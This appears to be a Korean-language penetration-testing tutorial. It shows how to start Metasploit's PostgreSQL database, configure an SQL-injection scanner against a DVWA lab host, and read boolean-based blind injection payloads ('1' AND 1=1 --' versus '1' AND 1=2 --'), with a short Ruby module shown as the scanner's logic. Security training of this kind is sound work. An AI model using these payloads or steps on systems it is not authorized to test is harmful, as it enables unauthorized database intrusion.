1. PostgreSQL 엔진 가동 및 자동화 설정 (DB Startup & Persistence)

Metasploit Framework(메타스플로잇 프레임워크, MSF)의 원활한 운영을 위해서는 PostgreSQL(포스트그레스큐엘) 데이터베이스가 필수적입니다. 시스템 재시작 시에도 서비스가 중단되지 않도록 지속성(Persistence)을 확보해야 합니다.

[도식: 데이터베이스 초기화 및 서비스 영속성 확보 프로세스]

STEP 01: START

PostgreSQL 즉시 실행

STEP 02: ENABLE

부팅 시 자동 가동 등록

STEP 03: MSFDB INIT

사용자 및 DB 스키마 생성

[Kali Linux Shell Commands]

# 서비스 즉시 가동
sudo systemctl start postgresql
# 재부팅 시 자동 가동 설정
sudo systemctl enable postgresql
# MSF 데이터베이스 초기화
sudo msfdb init

[MSF Console Verification]

msf6 > db_status
[*] Connected to msf. Connection type: postgresql.
참고: DB가 연결되면 `hosts` 명령어로 스캔된 자산을 영구 관리할 수 있습니다.

3. 모듈 활성화 및 옵션 설정 (Module Use & Configuration)

탐색된 모듈을 선택하고(Use), 필요한 매개변수(Options)를 확인한 뒤 공격 대상의 정보를 설정(Set)하는 단계입니다.

[Step A: 모듈 선택 및 옵션 확인]

msf6 > use auxiliary/scanner/http/sql_injection
msf6 auxiliary(http/sql_injection) > show options

# 핵심 옵션 설명
Name        Current Setting  Required  Description
----        ---------------  --------  -----------
RHOSTS                      yes       공격 대상 IP/호스트
URI         /               yes       취약점 의심 페이지 경로
GET_PARAMS                  no        테스트할 GET 파라미터명

[Step B: 타겟 설정 및 공격 실행]

msf6 auxiliary(http/sql_injection) > set RHOSTS 192.168.1.10
msf6 auxiliary(http/sql_injection) > set URI /dvwa/vulnerabilities/sqli/
msf6 auxiliary(http/sql_injection) > set GET_PARAMS id
msf6 auxiliary(http/sql_injection) > run

# 실행 결과 (Scan Output)
[*] 192.168.1.10:80 - Testing /dvwa/vulnerabilities/sqli/ ...
[+] 192.168.1.10:80 - Vulnerable to SQL injection at /dvwa/vulnerabilities/sqli/ (param: id)

공격 결과 심층 분석 (Deep Exploitation Analysis)

위 스캔 결과에서 Vulnerable(취약함) 판정이 내려진 이유는 모듈이 내부적으로 수행한 **차분 분석(Differential Analysis)** 때문입니다.

Injected Payload (주입된 페이로드) id=1' AND 1=1 --

모듈은 먼저 항상 참인 논리식(`1=1`)을 주입합니다. 이때 서버 응답 크기가 **4520 bytes**였다면, 이는 정상 데이터가 출력된 '참'의 결과입니다.

False Comparison (거짓 구문 비교) id=1' AND 1=2 --

다음으로 항상 거짓인 식(`1=2`)을 주입합니다. 응답 크기가 **4310 bytes**로 줄어들었다면, 서버가 주입된 SQL 논리를 실제로 실행하여 결과값을 필터링하고 있음을 확증하는 증거가 됩니다.

4. MSF 공격 모듈 소스 분석 (Deep Code Analysis)

메타스플로잇 모듈은 Ruby(루비) 언어로 작성됩니다. 모듈의 경로와 핵심 탐지 로직을 분석합니다.

/usr/share/metasploit-framework/modules/auxiliary/scanner/http/sql_injection.rb
class MetasploitModule < Msf::Auxiliary # 보조 모듈 클래스 정의
  include Msf::Exploit::Remote::HttpClient # HTTP 요청을 위한 API 믹스인

  def run
    print_status("Scanning for SQLi on #{datastore['RHOSTS']}...")
    
    # Boolean-based Blind 탐지 핵심 로직
    res_t = send_request_cgi({ 'vars_get' => { 'id' => "1' AND 1=1 -- " } })
    res_f = send_request_cgi({ 'vars_get' => { 'id' => "1' AND 1=2 -- " } })

    if res_t && res_f && (res_t.body.length != res_f.body.length)
      print_good("Vulnerability CONFIRMED through body length difference.")
    end
  end
end
